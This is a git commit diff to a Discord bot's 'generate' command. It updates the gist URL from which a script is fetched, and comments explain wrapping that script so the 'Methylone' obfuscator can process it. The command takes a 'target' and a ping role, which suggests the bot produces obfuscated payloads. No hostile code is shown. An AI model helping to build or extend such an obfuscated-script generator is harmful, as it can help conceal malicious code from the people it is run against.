6630547018b0d3c76804a3fcc89a86f4318a6a8b
ANTIWARE <bellaboosh123@gmail.com>
2026-08-14 20:02:36 +0100

    Stripped emojis and task.wait for obfuscator compatibility

--- src/commands/generate.js
+++ src/commands/generate.js
@@ -49,7 +49,7 @@ export async function execute(interaction) {
   const target = submitted.fields.getTextInputValue('target');
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
-  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/8993b76b0155cfe13edc18cb59c674557c024079/ANTIWARES2";
+  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/22d159a8de0406583cf7c4ce3a85eb289a71fd9b/ANTIWARES2";
   // ---- WRAPPER WITH ANONYMOUS FUNCTION ----
   // Wrapping in (function() ... end)() makes Methylone obfuscate the function body
   // instead of the raw script, preventing the "attempt to call a nil value" error.
